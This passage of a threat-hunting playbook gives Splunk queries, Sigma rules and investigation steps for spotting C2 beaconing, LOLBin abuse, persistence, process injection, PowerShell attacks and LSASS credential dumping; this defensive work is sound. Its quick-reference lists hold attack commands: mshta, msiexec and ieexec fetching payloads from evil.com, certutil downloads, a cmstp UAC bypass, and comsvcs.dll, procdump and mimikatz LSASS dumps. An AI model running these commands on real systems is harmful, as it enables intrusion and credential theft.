| where match(TargetFilename, "(?i)\.(zip|rar|7z|tar|gz|cab)$")
| stats count, values(TargetFilename) as files, values(Image) as creating_process
  by Computer, User
| sort - count

SPLUNK QUERY - Uploads to Cloud Storage:
index=proxy http_method=POST
| where match(url, "(?i)(dropbox|drive\.google|onedrive|mega\.nz|box\.com|
              sendspace|wetransfer|pastebin)")
| stats sum(bytes_out) as total_upload,
        count as upload_count,
        values(url) as destinations
  by src_ip, user
| where total_upload > 100000000  # 100MB
| sort - total_upload

SIGMA RULE:
title: Suspicious Archive Creation in Staging Directory
status: experimental
logsource:
    product: windows
    category: process_creation
detection:
    selection_tool:
        Image|endswith:
            - '\7z.exe'
            - '\7za.exe'
            - '\rar.exe'
            - '\WinRAR.exe'
            - '\zip.exe'
    selection_path:
        CommandLine|contains:
            - '\Temp\'
            - '\AppData\'
            - '\Public\'
            - '\ProgramData\'
            - '\Downloads\'
    condition: selection_tool and selection_path

INVESTIGATION STEPS:
1. Identify what files were archived
2. Check source of files (sensitive directories?)
3. Review destination of archive after creation
4. Look for exfiltration activity following staging
5. Check for encryption/password protection
6. Correlate with user's normal data handling patterns
```

### HYPOTHESIS 7: C2 Beaconing Detection

```
┌─────────────────────────────────────────────────────────────────────────┐
│ HYPOTHESIS                                                              │
│ Compromised systems are beaconing to C2 infrastructure at regular       │
│ intervals, which can be detected through timing analysis.               │
├─────────────────────────────────────────────────────────────────────────┤
│ ATT&CK MAPPING                                                          │
│ T1071 - Application Layer Protocol                                      │
│ T1573 - Encrypted Channel                                               │
│ T1571 - Non-Standard Port                                               │
├─────────────────────────────────────────────────────────────────────────┤
│ DATA SOURCES                                                            │
│ - Proxy Logs (HTTP/HTTPS)                                               │
│ - Firewall Logs                                                         │
│ - DNS Logs                                                              │
│ - Sysmon Event 3 (Network Connection)                                   │
│ - NetFlow/IPFIX                                                         │
└─────────────────────────────────────────────────────────────────────────┘

SPLUNK QUERY - Timing-Based Beaconing Detection:
index=proxy
| bucket _time span=5m
| stats count by src_ip, dest_domain, _time
| streamstats window=50 stdev(count) as count_stdev,
              avg(count) as count_avg by src_ip, dest_domain
| where count_stdev < 2 AND count_avg > 0
| stats count as beacon_windows,
        avg(count_avg) as avg_requests_per_window,
        values(count_stdev) as timing_variance
  by src_ip, dest_domain
| where beacon_windows > 100
| lookup domain_whitelist dest_domain OUTPUT is_whitelisted
| where is_whitelisted!="yes"
| sort - beacon_windows

SPLUNK QUERY - Connection Frequency Analysis:
index=sysmon EventCode=3
| bucket _time span=1h
| stats count by src_ip, DestinationIp, DestinationPort, _time
| eventstats stdev(count) as hourly_stdev,
             avg(count) as hourly_avg by src_ip, DestinationIp, DestinationPort
| where hourly_stdev/hourly_avg < 0.3  # Low coefficient of variation = regular
| stats count as connection_hours,
        values(DestinationPort) as ports
  by src_ip, DestinationIp
| where connection_hours > 24
| sort - connection_hours

SPLUNK QUERY - DNS Beaconing:
index=dns query_type=A
| bucket _time span=10m
| stats count by src_ip, query, _time
| eventstats stdev(count) as query_stdev, avg(count) as query_avg by src_ip, query
| where query_stdev < 1.5 AND query_avg > 0
| stats count as beacon_intervals by src_ip, query
| where beacon_intervals > 50
| eval domain = replace(query, "^[^.]+\.", "")
| lookup alexa_top_1m domain OUTPUT rank
| where isnull(rank) OR rank > 100000
| sort - beacon_intervals

SIGMA RULE:
title: Potential C2 Beaconing Activity
status: experimental
logsource:
    category: proxy
detection:
    timeframe: 1h
    selection:
        - response_code: 200
    condition: selection | eventstats stdev(count) as std by src_ip, dest | where std < 2

C2 BEACONING INDICATORS:
├── Regular timing intervals (low jitter)
├── Consistent payload sizes
├── Connections to young domains (<30 days old)
├── Low Alexa rank destinations
├── Unusual user agent strings
├── Non-standard HTTP methods
├── Base64 in URL parameters or POST body
├── HTTP over non-standard ports
└── Long-running connections with periodic activity

INVESTIGATION STEPS:
1. Analyze timing patterns for regularity
2. Check domain age and reputation
3. Review user agent and HTTP headers
4. Examine payload sizes and patterns
5. Look for DNS over HTTPS (DoH) or DNS tunneling
6. Check if endpoint has suspicious processes
7. Review TLS certificate details
```

### HYPOTHESIS 8: Living Off the Land Binaries (LOLBins)

```
┌─────────────────────────────────────────────────────────────────────────┐
│ HYPOTHESIS                                                              │
│ Attackers are abusing legitimate Windows binaries (LOLBins) for         │
│ downloading payloads, executing code, and evading detection.            │
├─────────────────────────────────────────────────────────────────────────┤
│ ATT&CK MAPPING                                                          │
│ T1218 - System Binary Proxy Execution                                   │
│ T1105 - Ingress Tool Transfer                                           │
│ T1059 - Command and Scripting Interpreter                               │
├─────────────────────────────────────────────────────────────────────────┤
│ DATA SOURCES                                                            │
│ - Sysmon Event 1 (Process Creation)                                     │
│ - Windows Security 4688 (Process Creation)                              │
│ - Sysmon Event 3 (Network Connection)                                   │
│ - Proxy Logs                                                            │
└─────────────────────────────────────────────────────────────────────────┘

SPLUNK QUERY - Download via LOLBins:
index=sysmon EventCode=1
| where (Image="*\\certutil.exe" AND match(CommandLine, "(?i)(-urlcache|-split|http|ftp)"))
   OR (Image="*\\bitsadmin.exe" AND match(CommandLine, "(?i)(transfer|download|http)"))
   OR (Image="*\\curl.exe" AND match(CommandLine, "(?i)(-o|-O|http)"))
   OR (Image="*\\wget.exe")
   OR (Image="*\\powershell.exe" AND match(CommandLine, "(?i)(downloadstring|downloadfile|
       invoke-webrequest|iwr|wget|curl|Net\.WebClient)"))
| rex field=CommandLine "(?<url>https?://[^\s\"]+)"
| stats count, values(CommandLine) as commands, values(url) as urls
  by Image, User, Computer
| sort - count

SPLUNK QUERY - Execution via LOLBins:
index=sysmon EventCode=1
| where (Image="*\\mshta.exe" AND match(CommandLine, "(?i)(http|javascript|vbscript)"))
   OR (Image="*\\regsvr32.exe" AND match(CommandLine, "(?i)(/i:|/s|scrobj|http)"))
   OR (Image="*\\rundll32.exe" AND match(CommandLine, "(?i)(javascript|http|shell32)"))
   OR (Image="*\\cmstp.exe" AND match(CommandLine, "(?i)(/s|/ni|\.inf)"))
   OR (Image="*\\msiexec.exe" AND match(CommandLine, "(?i)(/q|/i\s+http)"))
   OR (Image="*\\wmic.exe" AND match(CommandLine, "(?i)(process\s+call|create)"))
   OR (Image="*\\forfiles.exe" AND match(CommandLine, "(?i)/c"))
   OR (Image="*\\pcalua.exe" AND match(CommandLine, "(?i)-a"))
| stats count, values(CommandLine) as commands by Image, User, Computer
| sort - count

SPLUNK QUERY - LOLBin Network Connections:
index=sysmon EventCode=3
| where Image IN ("*\\certutil.exe", "*\\bitsadmin.exe", "*\\mshta.exe",
                  "*\\regsvr32.exe", "*\\msiexec.exe", "*\\cmstp.exe")
| stats count, values(DestinationIp) as dest_ips, values(DestinationPort) as ports
  by Image, User, Computer
| sort - count

SIGMA RULE:
title: Certutil Download Activity
status: experimental
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        Image|endswith: '\certutil.exe'
        CommandLine|contains:
            - '-urlcache'
            - '-split'
            - 'http'
            - 'ftp'
    condition: selection

SIGMA RULE - Regsvr32 Scriptlet Execution:
title: Regsvr32 Scriptlet Execution
status: experimental
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        Image|endswith: '\regsvr32.exe'
        CommandLine|contains:
            - '/i:http'
            - '/i:ftp'
            - 'scrobj.dll'
    condition: selection

LOLBIN QUICK REFERENCE:
┌─────────────────┬─────────────────────────────────────────────────────────┐
│ Binary          │ Abuse Technique                                         │
├─────────────────┼─────────────────────────────────────────────────────────┤
│ certutil.exe    │ Download: certutil -urlcache -split -f <url> <file>     │
│                 │ Decode: certutil -decode <encoded> <output>             │
├─────────────────┼─────────────────────────────────────────────────────────┤
│ mshta.exe       │ Execute HTA: mshta http://evil.com/mal.hta              │
│                 │ Inline: mshta "javascript:..."                          │
├─────────────────┼─────────────────────────────────────────────────────────┤
│ regsvr32.exe    │ Scriptlet: regsvr32 /s /n /u /i:http://url scrobj.dll   │
├─────────────────┼─────────────────────────────────────────────────────────┤
│ rundll32.exe    │ Execute: rundll32.exe javascript:"..."                  │
│                 │ DLL: rundll32.exe <dll>,<export>                        │
├─────────────────┼─────────────────────────────────────────────────────────┤
│ msiexec.exe     │ Install: msiexec /q /i http://evil.com/mal.msi          │
├─────────────────┼─────────────────────────────────────────────────────────┤
│ bitsadmin.exe   │ Download: bitsadmin /transfer job <url> <file>          │
├─────────────────┼─────────────────────────────────────────────────────────┤
│ wmic.exe        │ Remote exec: wmic /node:<host> process call create      │
├─────────────────┼─────────────────────────────────────────────────────────┤
│ cmstp.exe       │ UAC bypass: cmstp.exe /s /ni /unsecure <inf>            │
├─────────────────┼─────────────────────────────────────────────────────────┤
│ forfiles.exe    │ Execute: forfiles /p c:\windows /m notepad.exe /c <cmd> │
├─────────────────┼─────────────────────────────────────────────────────────┤
│ pcalua.exe      │ Execute: pcalua.exe -a <executable>                     │
├─────────────────┼─────────────────────────────────────────────────────────┤
│ esentutl.exe    │ Copy: esentutl.exe /y <src> /d <dst> /o                 │
├─────────────────┼─────────────────────────────────────────────────────────┤
│ expand.exe      │ Extract: expand.exe <cab> -F:* <dest>                   │
├─────────────────┼─────────────────────────────────────────────────────────┤
│ extrac32.exe    │ Extract: extrac32.exe /C /Y <cab> <dest>                │
├─────────────────┼─────────────────────────────────────────────────────────┤
│ ieexec.exe      │ Download/Exec: ieexec.exe http://evil.com/mal.exe       │
├─────────────────┼─────────────────────────────────────────────────────────┤
│ hh.exe          │ Execute CHM: hh.exe http://evil.com/mal.chm             │
└─────────────────┴─────────────────────────────────────────────────────────┘

INVESTIGATION STEPS:
1. Review full command line for suspicious arguments
2. Check what was downloaded or executed
3. Verify if this is legitimate administrative activity
4. Look for parent process anomalies
5. Check for subsequent process execution
6. Review network connections from the process
```

### HYPOTHESIS 9: Persistence Mechanisms

```
┌─────────────────────────────────────────────────────────────────────────┐
│ HYPOTHESIS                                                              │
│ Attackers have established persistence mechanisms to maintain access    │
│ after initial compromise, using scheduled tasks, services, or registry. │
├─────────────────────────────────────────────────────────────────────────┤
│ ATT&CK MAPPING                                                          │
│ T1053 - Scheduled Task/Job                                              │
│ T1543 - Create or Modify System Process                                 │
│ T1547 - Boot or Logon Autostart Execution                               │
│ T1546 - Event Triggered Execution                                       │
├─────────────────────────────────────────────────────────────────────────┤
│ DATA SOURCES                                                            │
│ - Windows Security 4698/4702 (Scheduled Task)                           │
│ - Windows Security 7045 (Service Installation)                          │
│ - Sysmon Event 12/13/14 (Registry)                                      │
│ - Sysmon Event 11 (File Creation in startup)                            │
│ - Sysmon Event 19/20/21 (WMI)                                           │
└─────────────────────────────────────────────────────────────────────────┘

SPLUNK QUERY - Scheduled Tasks:
index=windows EventCode=4698
| spath input=TaskContent
| eval task_action = 'Actions.Exec.Command'
| where NOT match(task_action, "(?i)(microsoft|windows|adobe|google|java)")
   AND NOT match(TaskName, "(?i)(microsoft|windows|adobe|google)")
| stats count by TaskName, task_action, SubjectUserName, Computer
| sort - count

SPLUNK QUERY - Suspicious Service Installation:
index=windows EventCode=7045
| where NOT match(ImagePath, "(?i)(c:\\windows\\|c:\\program files)")
| eval suspicious = case(
    match(ImagePath, "(?i)(temp|appdata|public|downloads)"), "suspicious_path",
    match(ImagePath, "(?i)\\\\"), "unc_path",
    match(ImagePath, "(?i)(cmd|powershell|wscript|cscript)"), "script_service",
    match(ImagePath, "(?i)\.bat|\.ps1|\.vbs"), "script_extension",
    1=1, "review"
  )
| where suspicious!="review"
| stats count by ServiceName, ImagePath, AccountName, Computer, suspicious
| sort - count

SPLUNK QUERY - Registry Run Keys:
index=sysmon EventCode=13
| where match(TargetObject, "(?i)\\\\CurrentVersion\\\\Run")
| where NOT match(Details, "(?i)(microsoft|windows|adobe|google|java)")
| stats count by TargetObject, Details, User, Image, Computer
| sort - count

SPLUNK QUERY - Startup Folder Modifications:
index=sysmon EventCode=11
| where match(TargetFilename, "(?i)Start Menu\\\\Programs\\\\Startup")
| where NOT match(TargetFilename, "(?i)(desktop\.ini)")
| stats count by TargetFilename, Image, User, Computer
| sort - count

SPLUNK QUERY - WMI Persistence:
index=sysmon EventCode IN (19, 20, 21)
| stats count by EventCode, Name, Consumer, Filter, User, Computer
| sort - count

SIGMA RULE - Suspicious Scheduled Task:
title: Scheduled Task with Suspicious Action
status: experimental
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4698
    suspicious_path:
        TaskContent|contains:
            - '\Temp\'
            - '\AppData\'
            - '\Public\'
            - 'powershell'
            - 'cmd.exe /c'
            - '.ps1'
            - 'http'
    condition: selection and suspicious_path

ALL PERSISTENCE LOCATIONS TO HUNT:

REGISTRY-BASED:
├── HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
├── HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
├── HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
├── HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
├── HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices
├── HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce
├── HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon (Userinit, Shell)
├── HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute
├── HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components
├── HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
└── HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders

FILE-SYSTEM BASED:
├── C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
├── C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
├── C:\Windows\System32\Tasks
└── C:\Windows\System32\GroupPolicy\Machine\Scripts

OTHER:
├── Scheduled Tasks (Task Scheduler)
├── Services (HKLM\SYSTEM\CurrentControlSet\Services)
├── WMI Event Subscriptions
├── Group Policy Scripts
├── DLL Search Order Hijacking
├── COM Hijacking (HKCU\SOFTWARE\Classes\CLSID)
├── BITS Jobs
├── AppInit_DLLs
├── Image File Execution Options (Debugger)
├── Accessibility Features (sethc.exe, utilman.exe replacement)
└── Print Processors

INVESTIGATION STEPS:
1. Identify the persistence mechanism used
2. Check creation time vs. initial access timeline
3. Review what the persistence mechanism executes
4. Look for associated files or scripts
5. Check for multiple persistence mechanisms
6. Identify if admin rights were required
```

### HYPOTHESIS 10: Defense Evasion - Process Injection

```
┌─────────────────────────────────────────────────────────────────────────┐
│ HYPOTHESIS                                                              │
│ Attackers are using process injection techniques to execute code in     │
│ the context of legitimate processes to evade detection.                 │
├─────────────────────────────────────────────────────────────────────────┤
│ ATT&CK MAPPING                                                          │
│ T1055 - Process Injection                                               │
│ T1055.001 - Dynamic-link Library Injection                              │
│ T1055.002 - Portable Executable Injection                               │
│ T1055.003 - Thread Execution Hijacking                                  │
│ T1055.012 - Process Hollowing                                           │
├─────────────────────────────────────────────────────────────────────────┤
│ DATA SOURCES                                                            │
│ - Sysmon Event 8 (CreateRemoteThread)                                   │
│ - Sysmon Event 10 (ProcessAccess)                                       │
│ - Sysmon Event 1 (Process Creation - hollowing)                         │
│ - Sysmon Event 7 (Image Loaded)                                         │
│ - EDR Telemetry                                                         │
└─────────────────────────────────────────────────────────────────────────┘

SPLUNK QUERY - CreateRemoteThread Detection:
index=sysmon EventCode=8
| where SourceImage != TargetImage
| eval suspicious = case(
    match(TargetImage, "(?i)(lsass|csrss|services|svchost|winlogon)"), "system_process",
    match(SourceImage, "(?i)(powershell|cmd|wscript|cscript|mshta)"), "scripting_engine",
    1=1, "other"
  )
| where NOT match(SourceImage, "(?i)(csrss|dwm|winlogon|wininit|msiexec|setup)")
| stats count by SourceImage, TargetImage, SourceUser, suspicious
| sort - count

SPLUNK QUERY - LSASS Access (Credential Dumping):
index=sysmon EventCode=10 TargetImage="*\\lsass.exe"
| where NOT SourceImage IN ("*\\csrss.exe", "*\\wininit.exe", "*\\MsMpEng.exe",
                            "*\\services.exe", "*\\svchost.exe", "*\\lsass.exe")
| eval access_rights = GrantedAccess
| stats count by SourceImage, SourceUser, access_rights, Computer
| sort - count

SPLUNK QUERY - Process Hollowing Detection:
index=sysmon EventCode=1
| where match(ParentImage, "(?i)(cmd|powershell|wscript|mshta)")
| where match(Image, "(?i)(svchost|dllhost|RuntimeBroker|sihost)")
| eval parent_path = mvindex(split(ParentCommandLine, " "), 0)
| where NOT match(CommandLine, "(?i)-k ")  # Normal svchost
| stats count by ParentImage, Image, CommandLine, User, Computer
| sort - count

SPLUNK QUERY - Suspicious DLL Loading:
index=sysmon EventCode=7 Signed="false"
| where match(Image, "(?i)(svchost|lsass|services|explorer)")
| where NOT match(ImageLoaded, "(?i)(c:\\windows\\|c:\\program files)")
| stats count by Image, ImageLoaded, Computer
| sort - count

SIGMA RULE:
title: CreateRemoteThread into LSASS
status: high
logsource:
    product: windows
    category: create_remote_thread
detection:
    selection:
        EventID: 8
        TargetImage|endswith: '\lsass.exe'
    filter:
        SourceImage|contains:
            - '\csrss.exe'
            - '\wininit.exe'
            - '\services.exe'
    condition: selection and not filter

INJECTION TECHNIQUES TO HUNT:
├── CreateRemoteThread - Sysmon Event 8
├── APC Injection - Look for unusual thread queue operations
├── Process Hollowing - Suspended process + memory write
├── Atom Bombing - GlobalGetAtomName API calls
├── DLL Injection - LoadLibrary in remote process
├── Reflective DLL Injection - No disk artifact
├── Process Doppelganging - NTFS transactions
└── Thread Execution Hijacking - SuspendThread + SetThreadContext

INVESTIGATION STEPS:
1. Identify source and target processes
2. Check if source is a known tool (Cobalt Strike, Metasploit)
3. Review what the target process subsequently did
4. Look for network connections from target
5. Check for credential access attempts
6. Correlate with other suspicious activity
```

### HYPOTHESIS 11: Defense Evasion - PowerShell Attacks

```
┌─────────────────────────────────────────────────────────────────────────┐
│ HYPOTHESIS                                                              │
│ Attackers are using PowerShell with obfuscation, encoded commands, or   │
│ AMSI bypasses to evade security controls and execute malicious code.    │
├─────────────────────────────────────────────────────────────────────────┤
│ ATT&CK MAPPING                                                          │
│ T1059.001 - Command and Scripting Interpreter: PowerShell               │
│ T1562.001 - Impair Defenses: Disable or Modify Tools                    │
│ T1027 - Obfuscated Files or Information                                 │
├─────────────────────────────────────────────────────────────────────────┤
│ DATA SOURCES                                                            │
│ - Windows PowerShell 4104 (Script Block Logging)                        │
│ - Sysmon Event 1 (Process Creation)                                     │
│ - Windows Security 4688 (Process Creation)                              │
└─────────────────────────────────────────────────────────────────────────┘

SPLUNK QUERY - Encoded PowerShell:
index=sysmon EventCode=1 Image="*\\powershell.exe"
| where match(CommandLine, "(?i)(-e\s|-en\s|-enc\s|-enco|-encod|-encode|-encodedcom)")
| rex field=CommandLine "(?i)-e[ncodedcommand]*\s+(?<encoded_payload>[A-Za-z0-9+/=]+)"
| eval decoded = base64decode(encoded_payload)
| stats count by User, Computer, decoded
| sort - count

SPLUNK QUERY - Download Cradles:
index=windows EventCode=4104
| where match(ScriptBlockText, "(?i)(downloadstring|downloadfile|
              invoke-webrequest|iwr|Net\.WebClient|webclient|
              invoke-restmethod|irm|curl|wget|Start-BitsTransfer)")
| rex field=ScriptBlockText "(?<url>https?://[^\s'\"]+)"
| stats count, values(url) as urls, values(ScriptBlockText) as scripts
  by Computer, UserName
| sort - count

SPLUNK QUERY - AMSI Bypass Attempts:
index=windows EventCode=4104
| where match(ScriptBlockText, "(?i)(amsi|amsiutils|amsiinitfailed|
              amsicontext|SetProtectedState|Reflection\.Assembly|
              GetType.*Amsi|LoadLibrary.*amsi)")
| stats count, values(ScriptBlockText) as scripts by Computer, UserName
| sort - count

SPLUNK QUERY - Obfuscation Detection:
index=windows EventCode=4104
| eval char_variety = len(replace(ScriptBlockText, "[^a-zA-Z]", ""))
| eval special_char = len(replace(ScriptBlockText, "[a-zA-Z0-9\s]", ""))
| eval obfuscation_score = special_char / (char_variety + 1)
| where obfuscation_score > 0.5 OR
        match(ScriptBlockText, "(?i)(\$\{|\-join|\-split|replace|char|
              \[char\]|\[int\]|\.invoke|iex\(|\.value)")
| stats count by Computer, UserName, obfuscation_score
| sort - obfuscation_score

SIGMA RULE:
title: Suspicious Encoded PowerShell Command
status: experimental
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains:
            - ' -e '
            - ' -en '
            - ' -enc '
            - ' -enco'
            - '-encodedcommand'
    condition: selection

POWERSHELL ATTACK INDICATORS:
├── Execution Policy Bypass: -ExecutionPolicy Bypass, -Exec Bypass
├── No Profile: -NoProfile, -NoP
├── Hidden Window: -WindowStyle Hidden, -W Hidden
├── Non-Interactive: -NonInteractive, -NonI
├── Encoded Commands: -EncodedCommand, -e, -enc
├── Download Strings: IEX (New-Object Net.WebClient).DownloadString
├── Reflective Loading: [Reflection.Assembly]::Load
├── AMSI Bypass: amsi, AmsiUtils, SetProtectedState
├── Constrained Language Mode Bypass: [PowerShell]::Create()
└── String Concatenation: ('Down'+'loadStr'+'ing')

INVESTIGATION STEPS:
1. Decode any encoded commands
2. Extract URLs and check reputation
3. Review what was downloaded or executed
4. Check for AMSI bypass attempts
5. Look for subsequent activity
6. Review parent process
```

### HYPOTHESIS 12: Credential Access - LSASS Dumping

```
┌─────────────────────────────────────────────────────────────────────────┐
│ HYPOTHESIS                                                              │
│ Attackers are attempting to dump credentials from LSASS memory using    │
│ tools like Mimikatz, ProcDump, or comsvcs.dll.                          │
├─────────────────────────────────────────────────────────────────────────┤
│ ATT&CK MAPPING                                                          │
│ T1003.001 - OS Credential Dumping: LSASS Memory                         │
├─────────────────────────────────────────────────────────────────────────┤
│ DATA SOURCES                                                            │
│ - Sysmon Event 10 (ProcessAccess to LSASS)                              │
│ - Sysmon Event 1 (Process Creation)                                     │
│ - Windows Security 4656/4663 (Object Access)                            │
│ - Windows Defender ATP Alerts                                           │
└─────────────────────────────────────────────────────────────────────────┘

SPLUNK QUERY - LSASS Access Detection:
index=sysmon EventCode=10 TargetImage="*\\lsass.exe"
| where NOT SourceImage IN ("*\\csrss.exe", "*\\wininit.exe",
                            "*\\MsMpEng.exe", "*\\services.exe",
                            "*\\lsass.exe", "*\\vmtoolsd.exe",
                            "*\\svchost.exe")
| eval access_rights = GrantedAccess
| lookup lsass_access_whitelist SourceImage OUTPUT is_whitelisted
| where is_whitelisted!="yes"
| stats count by SourceImage, SourceUser, access_rights, Computer
| sort - count

SPLUNK QUERY - Known Dumping Tools:
index=sysmon EventCode=1
| where match(CommandLine, "(?i)(mimikatz|sekurlsa|logonpasswords|
              procdump.*lsass|comsvcs.*MiniDump|sqldumper.*lsass|
              createdump|rdrleakdiag|tttracer)")
   OR match(Image, "(?i)(mimikatz|procdump|nanodump|pypykatz|
              dumpert|handlekatz|physmem2profit)")
| stats count by Image, CommandLine, User, Computer
| sort - count

SPLUNK QUERY - comsvcs.dll Dumping:
index=sysmon EventCode=1
| where Image="*\\rundll32.exe"
   AND match(CommandLine, "(?i)comsvcs.*MiniDump")
| stats count by CommandLine, User, Computer
| sort - count

SPLUNK QUERY - Suspicious Task Manager LSASS Dump:
index=sysmon EventCode=11
| where match(TargetFilename, "(?i)lsass.*\\.dmp")
   OR match(TargetFilename, "(?i)\\\\(temp|downloads|desktop)\\\\.*\\.dmp")
| stats count by TargetFilename, Image, User, Computer
| sort - count

SIGMA RULE:
title: LSASS Memory Access from Unknown Process
status: high
logsource:
    product: windows
    category: process_access
detection:
    selection:
        EventID: 10
        TargetImage|endswith: '\lsass.exe'
        GrantedAccess|contains:
            - '0x1010'  # PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION
            - '0x1038'  # PROCESS_VM_READ | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION
            - '0x1fffff'  # PROCESS_ALL_ACCESS
    filter:
        SourceImage|endswith:
            - '\csrss.exe'
            - '\wininit.exe'
            - '\MsMpEng.exe'
    condition: selection and not filter

LSASS DUMPING METHODS:
├── Mimikatz: sekurlsa::logonpasswords
├── ProcDump: procdump -ma lsass.exe
├── Task Manager: Right-click lsass > Create dump file
├── comsvcs.dll: rundll32 comsvcs.dll,MiniDump <PID> dump.dmp full
├── SQLDumper: sqldumper.exe <PID> 0 0x0128 0
├── Createdump (.NET): createdump.exe <PID>
├── PPLdump: For Protected Process Light bypass
├── NanoDump: Direct syscalls to evade EDR
├── HandleKatz: Handle duplication technique
└── Silent Process Exit: Registry-based dump trigger

INVESTIGATION STEPS:
1. Identify what tool/method was used
2. Check if dump file was created
3. Look for exfiltration of dump file
4. Review user context and privileges
5. Check for other credential access attempts
6. Identify scope of credential exposure
```

---

## Hunt Documentation Templates

### Standard Hunt Report Template

```
┌─────────────────────────────────────────────────────────────────────────┐
│ THREAT HUNT REPORT                                                      │
│═════════════════════════════════════════════════════════════════════════│
│                                                                         │
│ Hunt ID:        HUNT-2026-XXX                                           │
│ Hunt Name:      [Descriptive Name]                                      │
│ Date:           YYYY-MM-DD                                              │
│ Hunter:         [Analyst Name]                                          │
│ Duration:       [Hours Spent]                                           │
│ Status:         Completed / In Progress / Blocked                       │
│                                                                         │
├─────────────────────────────────────────────────────────────────────────┤
│ EXECUTIVE SUMMARY                                                       │
│─────────────────────────────────────────────────────────────────────────│
│ [2-3 sentence summary of the hunt, findings, and outcome]               │
│                                                                         │
├─────────────────────────────────────────────────────────────────────────┤
│ HYPOTHESIS                                                              │
│─────────────────────────────────────────────────────────────────────────│
│ Statement: [Clear, testable hypothesis]                                 │
│                                                                         │
│ Rationale: [Why this hypothesis was chosen]                             │
│ - Threat intel indicating [specific threat]                             │
│ - ATT&CK gap analysis identified [coverage gap]                         │
│ - Recent incident involving [related activity]                          │
│                                                                         │
│ ATT&CK Mapping: [Technique IDs]                                         │
│                                                                         │
├─────────────────────────────────────────────────────────────────────────┤
│ SCOPE                                                                   │
│─────────────────────────────────────────────────────────────────────────│
│ Time Range:     [Start] to [End]                                        │
│ Systems:        [All domain systems / Servers only / etc.]              │
│ Data Sources:   [List of data sources used]                             │
│ Limitations:    [Any scope limitations or data gaps]                    │
│                                                                         │
├─────────────────────────────────────────────────────────────────────────┤
│ METHODOLOGY                                                             │
│─────────────────────────────────────────────────────────────────────────│
│ Data Sources Used:                                                      │
│ - [Source 1]: [Description of how it was used]                          │
│ - [Source 2]: [Description of how it was used]                          │
│                                                                         │
│ Queries Executed:                                                       │
│ [Include full queries with explanations]                                │
│                                                                         │
│ Analysis Techniques:                                                    │
│ - [Technique 1]                                                         │
│ - [Technique 2]                                                         │
│                                                                         │
├─────────────────────────────────────────────────────────────────────────┤
│ RESULTS                                                                 │
│─────────────────────────────────────────────────────────────────────────│
│ Events Analyzed:    [Number]                                            │
│ Suspicious Items:   [Number]                                            │
│ False Positives:    [Number] (describe patterns)                        │
│ True Positives:     [Number]                                            │
│                                                                         │
│ Finding 1: [Title]                                                      │
│ - Description: [Detailed description]                                   │
│ - Evidence: [Specific evidence/logs]                                    │
│ - Assessment: True Positive / False Positive / Inconclusive             │
│ - Action: [Action taken]                                                │
│                                                                         │
│ Finding 2: [Title]                                                      │
│ [Repeat format]                                                         │
│                                                                         │
├─────────────────────────────────────────────────────────────────────────┤
│ CONCLUSION                                                              │
│─────────────────────────────────────────────────────────────────────────│
│ Hypothesis Status: Confirmed / Refuted / Partially Confirmed            │
│                                                                         │
│ Key Findings:                                                           │
│ 1. [Finding summary]                                                    │
│ 2. [Finding summary]                                                    │
│                                                                         │
├─────────────────────────────────────────────────────────────────────────┤
│ RECOMMENDATIONS                                                         │
│─────────────────────────────────────────────────────────────────────────│
│ Detection Improvements:                                                 │
│ - [New detection rule to create]                                        │
│ - [Existing rule to tune]                                               │
│                                                                         │
│ Visibility Improvements:                                                │
│ - [New log source to onboard]                                           │
│ - [Logging configuration to enable]                                     │
│                                                                         │
│ Security Improvements:                                                  │
│ - [Control to implement]                                                │
│ - [Policy to update]                                                    │
│                                                                         │
├─────────────────────────────────────────────────────────────────────────┤
│ ARTIFACTS                                                               │
│─────────────────────────────────────────────────────────────────────────│
│ Detection Rules Created: [SIGMA-2026-XXX, SPLUNK-2026-XXX]              │
│ Incidents Opened:        [INC-2026-XXX]                                 │
│ Related Hunts:           [HUNT-2026-XXX]                                │
│ Documentation:           [Links to additional docs]                     │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### Hypothesis Tracking Sheet

```
┌──────────────────────────────────────────────────────────────────────────────────────────────┐
│ HYPOTHESIS BACKLOG                                                                           │
├────────┬───────────────────────────┬──────────┬─────────┬────────┬─────────┬────────────────┤
│ ID     │ Hypothesis                │ Priority │ ATT&CK  │ Source │ Status  │ Assigned       │
├────────┼───────────────────────────┼──────────┼─────────┼────────┼─────────┼────────────────┤
│ H-001  │ APT using schtasks on DCs │ High     │ T1053   │ Intel  │ Planned │ [Analyst]      │
├────────┼───────────────────────────┼──────────┼─────────┼────────┼─────────┼────────────────┤
│ H-002  │ Beaconing via DNS TXT     │ Medium   │ T1071   │ ATT&CK │ Active  │ [Analyst]      │
├────────┼───────────────────────────┼──────────┼─────────┼────────┼─────────┼────────────────┤
│ H-003  │ LOLBin abuse for download │ High     │ T1105   │ Intel  │ Complete│ [Analyst]      │
└────────┴───────────────────────────┴──────────┴─────────┴────────┴─────────┴────────────────┘

PRIORITY CRITERIA:
├── Critical: Active threat intel, crown jewels at risk
├── High: Known TTP, gap in detection coverage
├── Medium: Emerging technique, moderate risk
└── Low: Theoretical, minimal current risk

SOURCES:
├── Intel: Threat intelligence report
├── ATT&CK: Gap analysis finding
├── Incident: Finding from IR
├── Red Team: Finding from assessment
└── Research: New technique publication
```

---

## Hunting Metrics and KPIs

### Coverage Metrics

```
ATT&CK COVERAGE TRACKING:
